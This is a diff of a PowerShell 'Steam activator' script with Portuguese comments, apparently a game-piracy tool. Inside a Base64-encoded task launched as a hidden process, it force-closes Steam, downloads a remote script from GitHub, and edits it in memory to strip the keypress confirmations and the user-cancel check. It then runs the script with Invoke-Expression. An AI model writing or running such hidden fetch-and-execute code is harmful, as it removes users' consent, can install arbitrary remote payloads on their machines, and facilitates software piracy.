@@ -26,41 +26,40 @@ try {
         $bgTask = @"
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         
-        # Define o caminho do log na pasta Temp do Windows
+        # Define o caminho do log
         `$logPath = "`$env:TEMP\SteamAtivador_Log.txt"
-        
-        # Inicia a gravação
         Start-Transcript -Path `$logPath -Force
         
         try {
-            Write-Output "Iniciando processo de instalacao invisivel..."
+            Write-Output "Fechando Steam para evitar bloqueio de arquivos (Acesso Negado)..."
+            Stop-Process -Name steam -Force -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 2
             
-            # Baixa o script da Steam original como texto
+            Write-Output "Baixando script original do GitHub..."
             `$s = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
-            Write-Output "Script base baixado com sucesso."
             
-            # --- EDIÇÃO AVANÇADA NA MEMÓRIA ---
+            Write-Output "Aplicando injeções de memória (Bypass de Confirmação)..."
+            
+            # PATCH 1 (Steamtools): Troca o 'Aperte qualquer tecla' por um pause de 2 segundos.
+            # Isso é perfeito pois mantém as 5 retentativas nativas do script fluindo perfeitamente.
+            `$s = `$s.Replace('[void][System.Console]::ReadKey(`$true)', 'Start-Sleep -Seconds 2')
+            
+            # PATCH 2 (Millennium): Zera o timer de 5 segundos
             `$s = `$s -replace '\`$milleniumTimer\s*=\s*5', '`$milleniumTimer = 0'
-            `$s = `$s -replace '\[void\]\s*\[System\.Console\]::ReadKey\([^)]*\)', ''
-            `$s = `$s -replace '\[System\.Console\]::ReadKey\([^)]*\)', ''
-            `$s = `$s -replace '\[Console\]::KeyAvailable', '`$false'
             
-            # CORREÇÃO: Usando comando nativo do PowerShell em vez de Taskkill
-            `$s = "Stop-Process -Name steam -Force -ErrorAction SilentlyContinue; " + `$s
+            # PATCH 3 (Millennium): Engana a checagem que verifica se o usuário cancelou a instalação
+            `$s = `$s.Replace('[Console]::KeyAvailable', '`$false')
 
-            Write-Output "Script modificado na memoria. Executando instalacao..."
-            
-            # Executa o script modificado
+            Write-Output "Executando script autônomo. Lidando com os cenários nativos..."
+            # O script agora vai rodar a lógica inteira sozinho. Se tiver a DLL, ele pula. Se não tiver, instala.
             Invoke-Expression `$s
 
-            Write-Output "Instalacao do script principal concluida."
-
-            # Baixa o aviso e abre no notepad
+            Write-Output "Baixando aviso final..."
             `$wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
             `$path = "`$env:TEMP\warning.txt"
             (New-Object System.Net.WebClient).DownloadFile(`$wUrl, `$path)
             Start-Process notepad.exe `$path
-            Write-Output "Aviso final exibido ao usuario."
+            Write-Output "Processo finalizado com sucesso!"
             
         } catch {
             Write-Error "ERRO FATAL DURANTE A EXECUÇÃO: `$(`$_.Exception.Message)"
@@ -69,7 +68,7 @@ try {
         }
 "@
 
-        # Conversão para Base64
+        # Conversão para Base64 para execução cega e limpa
         $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
         
         # Inicia o processo totalmente oculto
